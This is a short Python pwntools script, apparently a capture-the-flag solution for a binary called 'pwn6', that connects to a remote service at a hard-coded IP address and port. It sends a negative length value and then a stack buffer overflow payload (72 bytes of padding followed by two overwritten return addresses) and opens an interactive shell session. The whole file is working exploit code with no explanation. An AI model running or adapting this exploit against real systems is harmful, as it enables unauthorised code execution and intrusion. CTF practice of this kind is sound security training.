from pwn import *

# p = process('./pwn6')
p = remote('3.1.32.51', 8007)

p.sendline(b'-1')
payload = b'A'*72
payload += p64(0x40101a)
payload += p64(0x4012db)

p.sendline(payload)

p.interactive()